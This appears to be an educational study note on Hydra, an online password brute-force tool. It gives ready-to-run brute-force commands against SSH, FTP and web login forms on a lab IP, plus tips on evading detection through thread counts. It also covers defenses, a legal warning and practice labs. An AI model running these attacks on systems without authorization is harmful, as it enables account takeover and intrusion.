# 🐉 Hydra — Online Password Brute-Force Tool

## What is Hydra?

Hydra is a fast and flexible **online** password brute-force tool. Unlike John and Hashcat which crack hashes offline, Hydra attacks **live services** directly — sending login attempts over the network.

```
Hydra → Network → Live Service (SSH/FTP/HTTP login) → Try passwords
```

---

## Installation

Pre-installed on Kali Linux. Verify:

```bash
hydra -h
```

If not installed:

```bash
sudo apt install hydra -y
```

---

## Online vs Offline Cracking

| Tool | Type | Target |
|------|------|--------|
| John the Ripper | Offline | Hash file |
| Hashcat | Offline | Hash file |
| Hydra | Online | Live service |

> Online cracking is slower and noisier — every attempt hits the network and leaves logs. Fail2Ban and rate limiting can block it.

---

## Basic Syntax

```bash
hydra -l <username> -p <password> <target> <service>
hydra -l <username> -P <wordlist> <target> <service>
hydra -L <userlist> -P <wordlist> <target> <service>
```

| Flag | Meaning |
|------|---------|
| `-l` | Single username |
| `-L` | Username wordlist file |
| `-p` | Single password |
| `-P` | Password wordlist file |
| `-t` | Number of parallel threads |
| `-s` | Custom port |
| `-v` | Verbose output |
| `-V` | Very verbose — show every attempt |
| `-f` | Stop after first valid login found |
| `-o` | Save output to file |

---

## Supported Services

```bash
hydra --help | grep "Supported services"
```

Common supported services:

| Service | Protocol |
|---------|---------|
| SSH | Remote login |
| FTP | File transfer |
| HTTP/HTTPS | Web login forms |
| SMB | Windows file sharing |
| MySQL | Database |
| PostgreSQL | Database |
| RDP | Windows remote desktop |
| Telnet | Old remote login |
| SMTP | Email |
| POP3 | Email |

---

## Attack Examples

### SSH Brute Force

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.105
```

With custom port:

```bash
hydra -l root -P rockyou.txt -s 2222 ssh://192.168.1.105
```

---

### FTP Brute Force

```bash
hydra -l admin -P rockyou.txt ftp://192.168.1.105
```

---

### HTTP Login Form (POST)

Web login forms need more information — the form fields and failure message.

```bash
hydra -l admin -P rockyou.txt 192.168.1.105 http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials"
```

Breakdown:

| Part | Meaning |
|------|---------|
| `/login` | Login page URL path |
| `username=^USER^` | Form field name for username |
| `password=^PASS^` | Form field name for password |
| `Invalid credentials` | Text that appears on failed login |

> `^USER^` and `^PASS^` are Hydra placeholders — replaced with actual values during attack.

### ⚠️ Important — Include ALL Form Fields

When a browser submits a form, it sends **every field** — including hidden fields and submit button values. If Hydra is missing any field, the server may reject the request as invalid and Hydra will appear to fail even with correct credentials.

**Example — DVWA login has 3 fields:**

```
username=^USER^
password=^PASS^
Login=Login       ← submit button — must include this
```

Wrong (missing submit button → won't work):
```bash
hydra -l admin -P rockyou.txt 192.168.1.105 http-post-form \
"/login.php:username=^USER^&password=^PASS^:Login failed"
```

Correct (all fields included):
```bash
hydra -l admin -P rockyou.txt 192.168.1.105 http-post-form \
"/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

> **Rule:** Always intercept the actual login request with Burp Suite first. Copy the exact POST body — include every field exactly as the browser sends it.

---

### HTTP Basic Auth

```bash
hydra -l admin -P rockyou.txt 192.168.1.105 http-get /admin
```

---

### HTTPS Login Form

For HTTPS targets, replace `http-post-form` with `https-post-form`:

```bash
hydra -l admin -P rockyou.txt 192.168.1.105 https-post-form \
"/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

> Only `http` → `https` changes — everything else stays the same.

### ⚠️ SSL Certificate Issue with Hydra

Hydra may fail on HTTPS targets due to SSL certificate verification errors. This commonly happens with:
- Self-signed certificates (local labs)
- Expired certificates
- Internal/private CA certificates

Fix — use `-k` flag to skip certificate verification:

```bash
hydra -l admin -P rockyou.txt 192.168.1.105 https-post-form \
"/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -k
```

> `-k` tells Hydra to ignore SSL certificate errors and proceed anyway. Only use this in lab environments — never on production systems.

**Note:** Most local practice labs (DVWA, bWAPP) run on HTTP — HTTPS is mainly relevant for real-world targets.

---

### Multiple Usernames + Passwords

```bash
hydra -L userlist.txt -P rockyou.txt ssh://192.168.1.105
```

---

### Verbose + Save Output

```bash
hydra -l admin -P rockyou.txt ssh://192.168.1.105 -V -o results.txt
```

---

## How to Find HTTP Form Fields

Use browser developer tools or Burp Suite:

1. Open login page
2. Right-click → Inspect → Network tab
3. Submit a test login
4. Look at the POST request — find field names and failure message

Or with Burp Suite:
1. Intercept login request
2. Note field names from the POST body

---

## Speed Control

```bash
-t 4     # 4 parallel threads (default)
-t 16    # 16 threads (faster but noisier)
-t 1     # 1 thread (slower, less detectable)
```

> High thread count = faster attack but more likely to trigger Fail2Ban or rate limiting.

---

## Useful Commands Summary

```bash
# SSH single user wordlist
hydra -l admin -P rockyou.txt ssh://192.168.1.105

# SSH custom port
hydra -l admin -P rockyou.txt -s 2222 ssh://192.168.1.105

# FTP
hydra -l admin -P rockyou.txt ftp://192.168.1.105

# HTTP POST form
hydra -l admin -P rockyou.txt 192.168.1.105 http-post-form "/login:user=^USER^&pass=^PASS^:Login failed"

# Multiple users
hydra -L users.txt -P rockyou.txt ssh://192.168.1.105

# Verbose + output file
hydra -l admin -P rockyou.txt ssh://192.168.1.105 -V -o out.txt

# Stop after first success
hydra -l admin -P rockyou.txt ssh://192.168.1.105 -f
```

---

## Defenses Against Hydra

This is why you set up these in previous phases:

| Defense | How it stops Hydra |
|---------|-------------------|
| Fail2Ban | Bans IP after X failed attempts |
| SSH key only | Password login disabled — Hydra useless |
| Custom SSH port | Reduces automated scan hits |
| Rate limiting | Slows down attempts |
| Strong passwords | Wordlist won't contain it |

> After setting up SSH key auth and disabling password login — Hydra cannot attack your SSH at all. No password prompt = nothing to brute force.

---

## Key Concepts

- **Online attack** — attempts go over the network; leaves logs on target
- **Threads** — parallel connections; more threads = faster but noisier
- **`^USER^` / `^PASS^`** — Hydra placeholders replaced with actual wordlist values
- **Form failure string** — text Hydra looks for to know a login failed
- **Rate limiting** — server-side protection that slows or blocks too many requests

---

## ⚠️ Legal Warning

Only use Hydra on systems you own or have explicit written permission to test. Attacking live services without authorization is illegal and leaves traces in server logs.

---

## Practice Labs

- **DVWA** — HTTP login form brute force (set security to Low)
- **bWAPP** — brute force section
- **Metasploitable** — SSH, FTP brute force practice
- **TryHackMe** — dedicated Hydra rooms
